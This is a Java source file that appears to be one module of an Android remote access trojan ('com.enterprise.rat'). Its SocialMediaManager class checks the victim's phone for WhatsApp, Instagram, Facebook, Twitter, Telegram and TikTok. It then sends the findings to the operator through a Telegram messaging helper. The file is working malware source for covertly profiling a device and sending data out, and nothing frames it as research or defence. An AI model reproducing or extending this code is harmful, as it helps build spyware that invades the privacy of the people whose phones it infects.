package com.enterprise.rat.commands;

import android.content.Context;
import android.content.pm.PackageManager;
import com.enterprise.rat.utils.TelegramApi;

public class SocialMediaManager {
    private Context context;
    private final String[] targetPackages = {
        "com.whatsapp", "com.instagram.android", "com.facebook.katana", 
        "com.twitter.android", "org.telegram.messenger", "com.zhiliaoapp.musically"
    };

    public SocialMediaManager(Context context) { this.context = context; }

    public void auditSocialMedia() {
        PackageManager pm = context.getPackageManager();
        StringBuilder sb = new StringBuilder("<b>🔍 Social Media Audit:</b>\n\n");
        for (String pkg : targetPackages) {
            try {
                pm.getPackageInfo(pkg, 0);
                sb.append("✅ <code>").append(pkg).append("</code> is INSTALLED\n");
            } catch (PackageManager.NameNotFoundException e) {
                sb.append("❌ <code>").append(pkg).append("</code> not found\n");
            }
        }
        TelegramApi.sendMessage(sb.toString());
    }
}
